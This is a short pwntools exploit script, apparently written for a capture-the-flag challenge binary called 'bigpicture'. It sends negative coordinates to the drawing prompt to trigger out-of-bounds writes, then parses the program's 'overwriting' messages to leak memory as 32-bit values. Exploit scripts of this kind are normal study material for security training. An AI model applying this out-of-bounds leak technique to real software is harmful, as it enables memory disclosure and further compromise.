from __future__ import print_function
from pwn import *

debug = False
if debug:
    pass
else:
    sc = process("bigpicture")

#Clear prompt:
 #Let's draw a picture!
 #How big?
sc.recvuntil("? ")

#Send size and get to prompt
size = "0 x 0"
sc.sendline(size)
sc.recvuntil("> ")

#byte = 0
#dwrd = 0
count = 0
for dwrd in range(16):
    output = ""

    

    for byte in range(4):
        sploit = " " + str(byte) + " , " + str(-dwrd) + " , B"
        sc.sendline(sploit)
        output += sc.recvuntil("> ")

    output = output.replace("> ", '')
    output = output.replace('\n', '')
    output = output.replace("overwriting ", '')
    output = output.replace('!!', "%%")
    output = output.replace('!', '')
    output = output.replace("%%", '!')
    print(str(len(output)) + " " + str(output))
    if len(output)==8:
        print(u32(output))
    #print(output.replace('>', ''))


print(sc.recvall(timeout = 1))
#sc.interactive()
